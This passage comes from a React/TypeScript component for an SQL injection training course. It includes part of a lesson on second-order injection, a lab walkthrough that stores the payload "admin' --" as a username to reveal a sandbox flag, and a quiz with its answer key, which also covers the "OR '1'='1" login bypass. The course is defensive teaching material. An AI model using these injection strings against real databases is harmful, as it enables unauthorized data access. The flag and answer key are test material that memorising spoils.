Backend uses a Parameterized Query:    UPDATE users SET username = $1 WHERE id = 2
The database safely stores:           "admin' --"  (NO ATTACK OCCURS YET!)
                                           │
                                           ▼
STAGE 2: Execution (The Time Bomb Detonates!)
Days later, the user views their public profile:  GET /profile/2/view
The backend retrieves the stored name:             username = "admin' --"
The backend constructs a SECOND query:             SELECT * FROM bio WHERE name = 'admin' --'
THE ATTACK DETONATES IN QUERY #2!
\`\`\`

Because the payload was safe when originally submitted, WAFs and input validation filters failed to catch it. When the application trusted its own database data later on, the injection succeeded!
`
  },
  {
    id: 'lab-10',
    title: 'Lab 10: Second-Order SQLi Profile Exfiltration Walkthrough',
    type: 'lab',
    labUrl: '/vuln/sqli-10',
    description: 'Store unescaped malicious inputs safely; trigger execution on profile view to extract secret administrator flags.',
    walkthrough: `
# Lab 10 Walkthrough: Second-Order SQLi

### Objective:
Store a second-order payload in your profile username, then view the profile to trigger the execution and extract the secret admin flag: \`CSA{S3C0ND_0RD3R_M4ST3R}\`.

---

### 1. Step-by-Step Solution

1. Open \`/vuln/sqli-10\`.
2. In the **Edit Profile** tab, set the **Username** to:
   \`\`\`text
   admin' --
   \`\`\`
3. Click **Save Profile Changes**.
   * Notice the notification: *"Profile updated successfully (Safe Parameterized Operation)"*.
4. Now switch to the **View Profile** tab.
5. When the server looks up the profile data using your stored username, the trailing quote and comment take effect!
6. The secret administrator profile record is returned with the flag:
   \`\`\`text
   Flag: CSA{S3C0ND_0RD3R_M4ST3R}
   \`\`\`
7. The lab is completed!
`
  },
  {
    id: 'quiz-1',
    title: 'SQL Injection Mastery Certification Exam',
    type: 'quiz',
    quiz: [
      {
        question: 'What is the single most effective defense against SQL Injection vulnerabilities?',
        options: [
          'Installing a Web Application Firewall (WAF)',
          'Using Prepared Statements (Parameterized Queries)',
          'Base64 encoding all user inputs',
          'Restricting input length to 20 characters'
        ],
        correct: 1
      },
      {
        question: 'What purpose does the double-dash ("--") serve in a SQL Injection payload?',
        options: [
          'It instructs the database to delete the entire table',
          'It denotes a comment in SQL, causing the database to ignore the rest of the query line',
          'It encrypts the database connection',
          'It restarts the PostgreSQL database server'
        ],
        correct: 1
      },
      {
        question: 'In a UNION-based SQL injection attack, what rule must be strictly followed?',
        options: [
          'Both queries must have the exact same number of columns and compatible data types',
          'The query must return only numeric values',
          'The backend must be running on Linux',
          'The query must be executed over HTTPS'
        ],
        correct: 0
      },
      {
        question: 'Why does "admin\' OR \'1\'=\'1" successfully bypass authentication?',
        options: [
          'Because 1=1 is a mathematical tautology (always true), causing the WHERE clause to evaluate to true for the user record',
          'Because 1=1 is the default administrative password',
          'Because the database crashes and defaults to admin',
          'Because the single quotes turn off database security checks'
        ],
        correct: 0
      },
      {
        question: 'What characterizes a Second-Order SQL Injection vulnerability?',
        options: [
          'The attack can only be performed twice per IP address',
          'The payload is stored safely initially and only executes when retrieved and concatenated into a secondary query later',
          'The attack requires two separate database servers',
          'The attack only works on secondary replica databases'
        ],
        correct: 1
      }
    ]
  }
];

export default function SQLiCourseView(): JSX.Element {
  const [activeModuleId, setActiveModuleId] = useState(MODULES[0].id);
  const [completedModules, setCompletedModules] = useState<Record<string, boolean>>({});
  const [showWalkthrough, setShowWalkthrough] = useState(false);
  const [quizAnswers, setQuizAnswers] = useState<Record<number, number>>({});
  const [quizSubmitted, setQuizSubmitted] = useState(false);

  const fetchProgress = useCallback(async () => {
    const token = localStorage.getItem('token');
    if (!token) return;
    try {
      const res = await fetch('http://localhost:3000/api/progress', {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      const data = await res.json();
      if (data.ok && data.progress) {
        const completedMap: Record<string, boolean> = {};
        data.progress.forEach((p: any) => {
          if (p.completed && p.lab?.slug) {
            const mod = MODULES.find(m => 
              m.id === p.lab.slug || (m.labUrl && m.labUrl.endsWith(p.lab.slug))
            );
            if (mod) {
              completedMap[mod.id] = true;
            } else {
              completedMap[p.lab.slug] = true;
            }
          }
        });
        setCompletedModules(completedMap);
      }
    } catch (err) {
      console.error('Failed to load progress', err);
    }
  }, []);

  useEffect(() => {
    fetchProgress();

    // 1. Listen for local tab solve event
    const handleLabSolved = () => {
      fetchProgress();
    };
    window.addEventListener('lab-solved', handleLabSolved);

    // 2. Listen for cross-tab solve event via localStorage storage event
    const handleStorage = (e: StorageEvent) => {
      if (e.key === 'csa_lab_solved') {
        fetchProgress();
      }
    };
    window.addEventListener('storage', handleStorage);

    // 3. Recheck on window focus when user switches back from sandbox
    window.addEventListener('focus', fetchProgress);

    // 4. Polling while user is actively looking at an incomplete lab
    const pollInterval = setInterval(() => {
      fetchProgress();
    }, 2500);

    return () => {
      window.removeEventListener('lab-solved', handleLabSolved);
      window.removeEventListener('storage', handleStorage);
      window.removeEventListener('focus', fetchProgress);
      clearInterval(pollInterval);
    };
  }, [fetchProgress]);

  const activeModule = MODULES.find(m => m.id === activeModuleId) || MODULES[0];
  const activeIndex = MODULES.findIndex(m => m.id === activeModuleId);

  // Check if a module is unlocked (module 0 is unlocked; module i is unlocked only if all previous modules are completed)
  const isModuleUnlocked = (index: number): boolean => {
    if (index === 0) return true;
    for (let i = 0; i < index; i++) {
      if (!completedModules[MODULES[i].id]) return false;
    }
    return true;
  };

  // Only for reading lessons: marks theory complete and advances
  const markLessonCompleteAndNext = async () => {
    setCompletedModules(prev => ({ ...prev, [activeModule.id]: true }));
    const token = localStorage.getItem('token');
    if (token) {
      try {
        await fetch('http://localhost:3000/api/progress/complete', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${token}`
          },
          body: JSON.stringify({ labSlug: activeModule.id })
        });
      } catch (e) {
        console.error(e);
      }
    }
    if (activeIndex < MODULES.length - 1) {
      setActiveModuleId(MODULES[activeIndex + 1].id);
      setShowWalkthrough(false);
    }
  };

  const completedCount = Object.values(completedModules).filter(Boolean).length;
  const progressPercent = Math.round((completedCount / (MODULES.length - 1)) * 100);

  return (
    <div className="flex h-[calc(100vh-4rem)] bg-[#0A0A0F] text-slate-300 overflow-hidden font-sans w-full">
      
      {/* Sidebar navigation */}
      <aside className="w-80 border-r border-white/5 bg-[#0D0D14] flex flex-col flex-shrink-0">
        <div className="p-6 border-b border-white/5">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center text-indigo-400">
              <Database className="w-5 h-5" />
            </div>
            <div>
              <h2 className="font-bold text-white text-base tracking-tight">SQLi Masterclass</h2>
              <p className="text-xs text-slate-400">Database Vulnerability Track</p>
            </div>
          </div>

          <div className="mt-6">
            <div className="flex justify-between text-xs font-semibold mb-2">
              <span className="text-slate-400">Course Progress</span>
              <span className="text-indigo-400">{progressPercent}%</span>
            </div>
            <div className="h-2 w-full bg-white/5 rounded-full overflow-hidden">
              <div 
                className="h-full bg-gradient-to-r from-indigo-600 to-violet-500 transition-all duration-500" 
                style={{ width: `${progressPercent}%` }}
              />
            </div>
          </div>
        </div>

        <nav className="flex-1 overflow-y-auto p-4 space-y-1.5 custom-scrollbar">
          {MODULES.map((m, index) => {
            const isActive = m.id === activeModuleId;
            const isCompleted = !!completedModules[m.id];
            const isUnlocked = isModuleUnlocked(index);

            return (
              <button
                key={m.id}
                disabled={!isUnlocked}
                onClick={() => {
                  if (!isUnlocked) return;
                  setActiveModuleId(m.id);
                  setShowWalkthrough(false);
                }}
                className={`w-full flex items-center gap-3 px-3.5 py-3 rounded-xl text-left text-sm font-medium transition-all ${
                  isActive
                    ? 'bg-indigo-600/15 border border-indigo-500/30 text-white shadow-lg shadow-indigo-500/5'
                    : isUnlocked
                    ? 'text-slate-400 hover:text-white hover:bg-white/5 border border-transparent'
                    : 'text-slate-600 cursor-not-allowed border border-transparent opacity-60'
                }`}
              >
                {isCompleted ? (
                  <CheckCircle className="w-4 h-4 text-emerald-400 flex-shrink-0" />
                ) : !isUnlocked ? (
                  <Lock className="w-4 h-4 text-slate-600 flex-shrink-0" />
                ) : m.type === 'lab' ? (
                  <FlaskConical className={`w-4 h-4 flex-shrink-0 ${isActive ? 'text-indigo-400' : 'text-slate-500'}`} />
                ) : m.type === 'quiz' ? (
                  <LayoutGrid className={`w-4 h-4 flex-shrink-0 ${isActive ? 'text-indigo-400' : 'text-slate-500'}`} />
                ) : (
                  <BookOpen className={`w-4 h-4 flex-shrink-0 ${isActive ? 'text-indigo-400' : 'text-slate-500'}`} />
                )}
                <span className="truncate">{m.title}</span>
                {!isUnlocked && (
                  <span className="ml-auto text-[10px] uppercase font-mono px-1.5 py-0.5 rounded bg-white/5 text-slate-500">
                    Locked
                  </span>
                )}
              </button>
            );
          })}
        </nav>
      </aside>

      {/* Main Content Area */}
      <main className="flex-1 overflow-y-auto bg-[#0A0A0F] p-6 lg:p-10 xl:p-12 custom-scrollbar">
        <div className="w-full max-w-5xl xl:max-w-6xl 2xl:max-w-7xl mx-auto space-y-8">
          
          {/* Header */}
          <div className="border-b border-white/5 pb-6 flex items-center justify-between flex-wrap gap-4">
            <div>
              <span className="text-xs font-mono font-bold text-indigo-400 bg-indigo-500/10 px-3 py-1 rounded-full border border-indigo-500/20">
                {activeModule.type.toUpperCase()}
              </span>
              <h1 className="text-3xl font-black text-white tracking-tight mt-3">
                {activeModule.title}
              </h1>
            </div>

            {completedModules[activeModule.id] ? (
              <div className="flex items-center gap-2 px-4 py-2 rounded-xl bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 text-sm font-semibold font-mono shadow-[0_0_15px_rgba(16,185,129,0.2)]">
                <CheckCircle className="w-4 h-4 text-emerald-400" />
                <span>Completed</span>
              </div>
            ) : activeModule.type === 'lab' ? (
              <div className="flex items-center gap-2 px-4 py-2 rounded-xl bg-amber-500/10 border border-amber-500/25 text-amber-400 text-sm font-semibold font-mono animate-pulse">
                <Lock className="w-4 h-4" />
                <span>Sandbox Solve Required</span>
              </div>
            ) : null}
          </div>

          {/* Lesson Content */}
          {activeModule.type === 'lesson' && (
            <div className="prose prose-invert max-w-none prose-headings:text-white prose-p:text-slate-300 prose-code:text-indigo-300 prose-pre:bg-[#12121A] prose-pre:border prose-pre:border-white/10 prose-strong:text-white leading-relaxed">
              <ReactMarkdown remarkPlugins={[remarkGfm]}>
                {activeModule.content || ''}
              </ReactMarkdown>
              
              <div className="mt-10 pt-6 border-t border-white/5 flex justify-end">
                <button
                  onClick={markLessonCompleteAndNext}
                  className="flex items-center gap-2 px-6 py-3 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white font-bold transition-all shadow-lg shadow-indigo-600/20"
                >
                  <span>Mark Completed & Continue</span>
                  <Play className="w-4 h-4 fill-white" />
                </button>
              </div>
            </div>
          )}

          {/* Lab Content */}
          {activeModule.type === 'lab' && (
            <div className="space-y-6">
              <div className="rounded-2xl border border-white/10 bg-[#12121A] p-8 space-y-6">
                <div>
                  <h3 className="text-xl font-bold text-white mb-2">Lab Objective</h3>
                  <p className="text-slate-300 leading-relaxed">{activeModule.description}</p>
                </div>

                <div className="flex items-center gap-4 flex-wrap">
                  <a
                    href={activeModule.labUrl}
                    target="_blank"
                    rel="noreferrer"
                    className="flex items-center gap-2 px-6 py-3.5 rounded-xl bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-500 hover:to-violet-500 text-white font-bold transition-all shadow-xl shadow-indigo-600/20 hover:-translate-y-0.5"
                  >
                    <FlaskConical className="w-5 h-5" />
                    <span>Launch Interactive Lab Sandbox</span>
                  </a>

                  <button
                    onClick={fetchProgress}
                    className="flex items-center gap-2 px-4 py-3.5 rounded-xl border border-white/10 bg-white/5 hover:bg-white/10 text-slate-300 hover:text-white font-semibold text-xs font-mono transition-all"
                    title="Re-check sandbox completion status"
                  >
                    <RotateCw className="w-4 h-4" />
                    <span>Verify Status</span>
                  </button>

                  <button
                    onClick={() => setShowWalkthrough(!showWalkthrough)}
                    className="flex items-center gap-2 px-5 py-3.5 rounded-xl border border-white/10 bg-white/5 hover:bg-white/10 text-slate-300 hover:text-white font-semibold transition-all"
                  >
                    <span>{showWalkthrough ? 'Hide Walkthrough Guide' : 'Show Walkthrough Guide'}</span>
                    {showWalkthrough ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </button>
                </div>
              </div>

              {/* Collapsible Walkthrough */}
              {showWalkthrough && (
                <div className="rounded-2xl border border-indigo-500/20 bg-[#12121A]/80 p-8 prose prose-invert max-w-none prose-headings:text-white prose-p:text-slate-300 prose-code:text-indigo-300 prose-pre:bg-[#0A0A0F] prose-pre:border prose-pre:border-white/10 animate-in fade-in duration-300">
                  <ReactMarkdown remarkPlugins={[remarkGfm]}>
                    {activeModule.walkthrough || ''}
                  </ReactMarkdown>
                </div>
              )}

              {/* Lab Navigation Gating */}
              <div className="mt-8 pt-6 border-t border-white/5 flex flex-col sm:flex-row items-center justify-between gap-4">
                {!completedModules[activeModule.id] ? (
                  <>
                    <div className="flex items-center gap-2.5 text-xs font-mono text-amber-400 bg-amber-500/10 border border-amber-500/25 px-4 py-2.5 rounded-xl">
                      <Lock className="w-4 h-4 text-amber-400 flex-shrink-0" />
                      <span>Sandbox Verification Required: Solve the lab in the sandbox to unlock the next module.</span>
                    </div>
                    <button
                      disabled
                      className="flex items-center gap-2 px-6 py-3 rounded-xl bg-white/5 text-slate-500 border border-white/10 font-bold font-mono text-xs cursor-not-allowed opacity-60 flex-shrink-0"
                    >
                      <Lock className="w-4 h-4 text-slate-500" />
                      <span>Proceed to Next Module</span>
                    </button>
                  </>
                ) : (
                  <>
                    <div className="flex items-center gap-2 text-xs font-mono text-emerald-400 font-bold bg-emerald-500/10 border border-emerald-500/20 px-4 py-2.5 rounded-xl shadow-[0_0_15px_rgba(16,185,129,0.15)]">
                      <CheckCircle className="w-4 h-4 text-emerald-400 flex-shrink-0" />
                      <span>Lab Breach Verified & Cleared!</span>
                    </div>
                    <button
                      onClick={() => {
                        if (activeIndex < MODULES.length - 1) {
                          setActiveModuleId(MODULES[activeIndex + 1].id);
                          setShowWalkthrough(false);
                        }
                      }}
                      className="flex items-center gap-2 px-6 py-3 rounded-xl bg-gradient-to-r from-emerald-600 via-indigo-600 to-indigo-600 hover:from-emerald-500 hover:to-indigo-500 text-white font-bold font-mono text-xs transition-all shadow-lg shadow-emerald-500/20 flex-shrink-0 hover:scale-105 active:scale-95"
                    >
                      <span>Proceed to Next Module</span>
                      <Play className="w-4 h-4 fill-white" />
                    </button>
                  </>
                )}
              </div>
            </div>
          )}

          {/* Quiz Content */}
          {activeModule.type === 'quiz' && (
            <div className="space-y-8">
              <div className="rounded-2xl border border-white/10 bg-[#12121A] p-8 space-y-8">
                <h3 className="text-xl font-bold text-white">SQL Injection Certification Assessment</h3>
                
                {activeModule.quiz?.map((q, qIndex) => {
                  const selected = quizAnswers[qIndex];
                  return (
                    <div key={qIndex} className="space-y-4 border-b border-white/5 pb-6 last:border-0">
                      <p className="font-semibold text-white text-base">
                        {qIndex + 1}. {q.question}
                      </p>
                      
                      <div className="space-y-2">
                        {q.options.map((opt, optIndex) => {
                          let optClass = "border-white/5 bg-white/5 text-slate-300 hover:bg-white/10";
                          if (quizSubmitted) {
                            if (optIndex === q.correct) {
                              optClass = "border-emerald-500/50 bg-emerald-500/20 text-emerald-300 font-semibold";
                            } else if (selected === optIndex) {
                              optClass = "border-rose-500/50 bg-rose-500/20 text-rose-300";
                            }
                          } else if (selected === optIndex) {
                            optClass = "border-indigo-500/50 bg-indigo-500/20 text-white font-semibold";
                          }

                          return (
                            <button
                              key={optIndex}
                              disabled={quizSubmitted}
                              onClick={() => setQuizAnswers({ ...quizAnswers, [qIndex]: optIndex })}
                              className={`w-full text-left p-3.5 rounded-xl border text-sm transition-all ${optClass}`}
                            >
                              {opt}
                            </button>
                          );
                        })}
                      </div>
                    </div>
                  );
                })}

                <div className="flex justify-between items-center pt-4">
                  {!quizSubmitted ? (
                    <button
                      onClick={() => setQuizSubmitted(true)}
                      disabled={Object.keys(quizAnswers).length < (activeModule.quiz?.length || 0)}
                      className="px-8 py-3.5 rounded-xl bg-indigo-600 hover:bg-indigo-500 disabled:opacity-50 text-white font-bold transition-all shadow-lg shadow-indigo-600/20"
                    >
                      Submit Answers
                    </button>
                  ) : (
                    <button
                      onClick={() => {
                        setQuizSubmitted(false);
                        setQuizAnswers({});
                      }}
                      className="px-6 py-3 rounded-xl border border-white/10 bg-white/5 hover:bg-white/10 text-white font-semibold"
                    >
                      Retry Assessment
                    </button>
                  )}
                </div>
              </div>
            </div>
          )}

        </div>
      </main>
    </div>
  );
}
